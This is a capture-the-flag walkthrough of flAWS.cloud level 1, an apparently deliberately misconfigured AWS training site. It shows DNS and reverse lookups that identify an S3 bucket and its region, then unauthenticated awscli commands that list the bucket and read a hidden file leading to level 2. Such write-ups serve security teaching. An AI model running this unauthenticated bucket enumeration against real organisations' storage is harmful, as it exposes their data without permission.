# flAWS.cloud Writeup - Level 1
Level one is fairly simple, and is about finding the correct subdomain to get to the next level.

The site flaws.cloud is hosted as an AWS S3 bucket. This is a great way to host a static site, and is similar to hosting a site on github pages.

Some interesting facts about hosting a site within an S3 bucket:
 - When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must be the same as the domain name (flaws.cloud)
 - S3 buckets are a global name space, meaning two people cannot have buckets with the same name.
  - The result of this is that you could create a bucket named facebook.com and Facebook would never be able to host their main site via S3 hosting.

Back to the challenge...
---
You can determine the site is hosted on AWS as an S3 bucket by running a DNS lookup on the domain `flaws.com`, such as:
```
dig any flaws.cloud

; <<>> DiG 9.16.15-Debian <<>> any flaws.cloud
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52294
;; flags: qr rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;flaws.cloud.			IN	ANY

;; ANSWER SECTION:
flaws.cloud.		5	IN	A	52.218.168.202
flaws.cloud.		170783	IN	NS	ns-448.awsdns-56.com.
flaws.cloud.		170783	IN	NS	ns-966.awsdns-56.net.
flaws.cloud.		170783	IN	NS	ns-1061.awsdns-04.org.
flaws.cloud.		170783	IN	NS	ns-1890.awsdns-44.co.uk.
flaws.cloud.		900	IN	SOA	ns-1890.awsdns-44.co.uk. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400

;; Query time: 72 msec
;; SERVER: 192.168.75.2#53(192.168.75.2)
;; WHEN: Mon Jul 12 11:25:17 EDT 2021
;; MSG SIZE  rcvd: 257
```
Visiting `52.218.168.202` takes you to `https://aws.amazon.com/s3/`, confirming that flaws.cloud is hosted as an S3 bucket.

You can then run nslookup to get the AWS region:
```
nslookup 52.218.168.202

202.168.218.52.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.

Authoritative answers can be found from:
```
Now that you have the region of the AWS S3 bucket, due to some misconfigurations you can simply read files using the `awscli`:
```
aws s3 ls s3://flaws.cloud --no-sign

2017-03-13 23:00:38       2575 hint1.html
2017-03-02 23:05:17       1707 hint2.html
2017-03-02 23:05:11       1101 hint3.html
2020-05-22 14:16:45       3162 index.html
2018-07-10 12:47:16      15979 logo.png
2017-02-26 20:59:28         46 robots.txt
2017-02-26 20:59:30       1051 secret-dd02c7c.html
```
Then, either navigate to http://flaws.cloud/secret-dd02c7c.html, or copy it from the bucket, into your stdout using `awscli` again:
```
aws s3 cp s3://flaws.cloud/secret-dd02c7c.html - --no-sign

<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
            :not(center) > pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000; 
            border-width: 1px; border-style: solid;} 
        </style>
    </head>
<body 
  text="#00d000" 
  bgcolor="#000000"  
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
    
<center>
<pre >
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>


Level 2 is at <a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</a>
```

Thus, the next level is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.
